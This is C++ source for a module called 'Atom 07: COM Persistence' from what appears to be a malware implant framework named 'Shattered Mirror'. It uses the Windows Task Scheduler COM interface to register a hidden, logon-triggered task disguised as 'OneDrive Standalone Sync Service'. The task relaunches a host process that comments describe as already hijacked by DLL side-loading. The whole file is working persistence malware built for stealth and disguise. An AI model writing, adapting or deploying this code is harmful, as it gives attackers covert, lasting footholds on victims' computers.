/*=============================================================================
 * Shattered Mirror v1 — Atom 07: COM Persistence
 *
 * Implements COM ITaskService to silently register a daily scheduled task
 * disguised as a Windows Update or OneDrive standalone updater.
 *===========================================================================*/

#include "Atom_07_Persist.h"
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

BOOL CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    /* Security Initialization */
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);
    
    // Ignore RPC_E_TOO_LATE in case it was already setup by host process
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        CoUninitialize();
        return FALSE;
    }

    ITaskService *pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
                           NULL,
                           CLSCTX_INPROC_SERVER,
                           IID_ITaskService,
                           (void**)&pService);  
    if (FAILED(hr)) {
        CoUninitialize();
        return FALSE;
    }

    /* Connect to the task service */
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    /* Get the Root Task Folder */
    ITaskFolder *pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    /* If the task exists, delete it first to ensure update */
    pRootFolder->DeleteTask(_bstr_t(pwszTaskName), 0);

    /* Create the task builder object */
    ITaskDefinition *pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    
    pService->Release();  
    if (FAILED(hr)) {
        pRootFolder->Release();
        CoUninitialize();
        return FALSE;
    }

    /* Setup Logon Trigger */
    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr)) {
        ITrigger *pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr)) {
            ILogonTrigger *pLogonTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
            if (SUCCEEDED(hr)) {
                // pLogonTrigger->put_UserId( (_bstr_t) L"DOMAIN\\User" ); 
                pLogonTrigger->Release();
            }
            pTrigger->Release();
        }
        pTriggerCollection->Release();
    }

    /* Add an Action (Execute the payload) */
    IActionCollection *pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr)) {
        IAction *pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction *pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                pExecAction->put_Path(_bstr_t(pwszExecutablePath));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    /* Setup Settings (Hidden, Run with Highest Privileges if possible) */
    IPrincipal *pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA); /* Fallback to Highest if admin */
        pPrincipal->Release();
    }

    ITaskSettings *pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->put_Hidden(VARIANT_TRUE);
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->Release();
    }

    /* Save the task */
    IRegisteredTask *pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(pwszTaskName),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask);

    if (pRegisteredTask) pRegisteredTask->Release();
    pRootFolder->Release();
    pTask->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

DWORD WINAPI PersistAtomMain(LPVOID lpParam) {
    /* 
     * Identify the path of the host process (which should be hijacked already
     * since we are inside it, e.g. OneDrive.exe with our version.dll next to it)
     */
    WCHAR szMyPath[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, szMyPath, MAX_PATH);

    /* Register under a benign sounding name */
    CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
    
    return 0;
}
